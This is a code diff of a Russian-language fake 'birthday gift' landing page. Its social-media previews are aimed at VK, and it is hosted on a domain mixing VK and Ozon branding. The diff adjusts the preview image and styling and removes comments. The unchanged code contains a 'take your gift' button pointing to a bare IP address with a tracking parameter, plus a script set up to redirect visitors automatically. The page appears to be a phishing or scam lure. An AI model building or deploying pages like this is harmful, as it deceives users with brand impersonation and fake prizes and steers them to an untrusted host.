@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Забери подарки прямо сейчас 🎁</title>
 
-    <!-- Open Graph теги для красивого превью в ВК (ваша ссылка) -->
+    <!-- Open Graph теги для ВК -->
     <meta property="og:title" content="Забери подарки прямо сейчас 🎁">
     <meta property="og:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
+    <meta property="og:image" content="https://vk-ozon-podarki.github.io/preview.jpg">
     <meta property="og:url" content="https://vk-ozon-podarki.github.io/">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Забери подарки прямо сейчас">
@@ -17,14 +17,14 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Забери подарки прямо сейчас 🎁">
     <meta name="twitter:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
-    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
+    <meta name="twitter:image" content="https://vk-ozon-podarki.github.io/preview.jpg">
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #a6d0f8;
+            background: linear-gradient(180deg, #2f8ef0 0%, #a6d0f8 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -37,9 +37,9 @@
             width: 100%;
             max-width: 520px;
             margin: 0 auto;
+            padding: 20px 0;
         }
 
-        /* ВОТ ЗДЕСЬ МЫ ПОКАЗЫВАЕМ ВАШ ФАЙЛ cake.jpg ИЗ РЕПОЗИТОРИЯ */
         .hero-wrap img {
             display: block;
             width: 100%;
@@ -91,11 +91,6 @@
         }
 
         @media (min-width: 561px) {
-            body {
-                background: linear-gradient(180deg, #2f8ef0 0%, #a6d0f8 100%);
-                justify-content: center;
-                padding: 40px 0;
-            }
             .hero-wrap {
                 max-width: 430px;
                 border-radius: 26px;
@@ -110,17 +105,14 @@
     <div id="confetti-container"></div>
 
     <div class="hero-wrap">
-        <!-- ЗДЕСЬ ИМЯ ФАЙЛА, КОТОРЫЙ ЛЕЖИТ У ВАС В РЕПОЗИТОРИИ -->
         <img src="cake.jpg" alt="Праздничный торт">
         
-        <!-- ССЫЛКА НА ПОДАРОК -->
         <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
             🎁 Забрать подарок
         </a>
     </div>
 
     <script>
-        // Конфетти
         function createConfetti() {
             const container = document.getElementById('confetti-container');
             const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd', '#01a3a4', '#f368e0'];
@@ -140,7 +132,6 @@
         }
         createConfetti();
 
-        // Автопереход через 6 секунд
         const giftBtn = document.getElementById('giftBtn');
         const targetUrl = giftBtn.href;
 
